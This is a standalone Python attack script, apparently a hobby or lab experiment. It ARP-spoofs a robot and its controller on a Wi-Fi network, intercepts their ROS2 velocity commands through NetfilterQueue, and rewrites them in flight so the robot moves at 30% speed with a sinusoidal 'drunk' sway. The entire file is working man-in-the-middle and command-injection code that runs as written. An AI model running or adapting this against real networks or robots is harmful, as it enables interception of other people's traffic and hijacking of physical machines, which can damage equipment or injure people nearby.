from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import struct
import sys
import math

# --- SETTINGS ---
robot_ip      = "192.168.0.139"
controller_ip = "192.168.0.78"
interface     = "wlan0"
queue_number  = 1

# --- DRUNK PARAMETERS ---
SPEED_MULTIPLIER = 0.3  # 30% of original speed
SWAY_AMPLITUDE   = 1.8  # How wide the "drunk" swings are
SWAY_FREQUENCY   = 1.2  # How fast the robot staggers back and forth

# --- MAC RESOLUTION & ARP SPOOFING ---
def get_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip:
                    return fields[3]
    except:
        pass
    return None

def spoof(target_ip, host_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip
    )
    sendp(packet, iface=interface, verbose=False)

def arp_poison_thread(robot_mac, controller_mac):
    print(f"[*] Poisoning {robot_ip} <--> {controller_ip}...")
    while True:
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(0.05)

# --- TWIST DETECTION ---
def find_twist_offsets(payload):
    # Scan for 6 doubles (Linear X,Y,Z and Angular X,Y,Z)
    for i in range(len(payload) - 48):
        try:
            vals = struct.unpack('<6d', payload[i:i+48])
            # Heuristic for valid velocity values
            if all(-15.0 < v < 15.0 for v in vals):
                lin_x = vals[0]
                ang_z = vals[5]
                if abs(lin_x) > 0.001 or abs(ang_z) > 0.001:
                    return i, i + 40 
        except:
            continue
    return None, None

# --- PACKET PROCESSING (THE DRUNK FILTER) ---
def process_packet(packet):
    try:
        scapy_pkt = IP(packet.get_payload())

        if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
            raw_data = scapy_pkt[Raw].load

            # RTPS DATA marker for ROS2
            if b'\x15\x05' in raw_data:
                lin_x_off, ang_z_off = find_twist_offsets(raw_data)

                if lin_x_off is not None:
                    # 1. Extract original values
                    orig_lin_x = struct.unpack('<d', raw_data[lin_x_off:lin_x_off+8])[0]
                    orig_ang_z = struct.unpack('<d', raw_data[ang_z_off:ang_z_off+8])[0]

                    # 2. Apply "Drunk & Slow" Transformation
                    new_lin_x = orig_lin_x * SPEED_MULTIPLIER
                    # Swaying effect: Original rotation + Sine(time)
                    sway = SWAY_AMPLITUDE * math.sin(time.time() * SWAY_FREQUENCY)
                    new_ang_z = orig_ang_z + sway

                    # 3. Rebuild the payload
                    new_payload = (
                        raw_data[:lin_x_off] +
                        struct.pack('<d', float(new_lin_x)) +
                        raw_data[lin_x_off+8:ang_z_off] +
                        struct.pack('<d', float(new_ang_z)) +
                        raw_data[ang_z_off+8:]
                    )

                    scapy_pkt[Raw].load = new_payload

                    # 4. Clean up checksums
                    del scapy_pkt[IP].len
                    del scapy_pkt[IP].chksum
                    del scapy_pkt[UDP].len
                    del scapy_pkt[UDP].chksum

                    packet.set_payload(bytes(scapy_pkt))
                    
                    sys.stdout.write(f"\r[*] Distorting: Lin {new_lin_x:.2f} | Ang {new_ang_z:.2f}    ")
                    sys.stdout.flush()

    except Exception as e:
        print(f"\n[ERROR] {e}")

    packet.accept()

# --- MAIN ---
if __name__ == "__main__":
    r_mac = get_mac(robot_ip)
    c_mac = get_mac(controller_ip)

    if r_mac and c_mac:
        # Start ARP Spoofing
        threading.Thread(target=arp_poison_thread, args=(r_mac, c_mac), daemon=True).start()

        # Start Netfilter Queue
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_number, process_packet)

        print(f"[*] DRUNK HIJACK ACTIVE: {controller_ip} -> {robot_ip}")
        print("[*] Speed Scaled: 30% | Sway: Sine Wave")

        try:
            nfqueue.run()
        except KeyboardInterrupt:
            print("\n[*] Restoring network...")
            nfqueue.unbind()
    else:
        print("[!] Could not find MAC addresses. Are the devices online?")
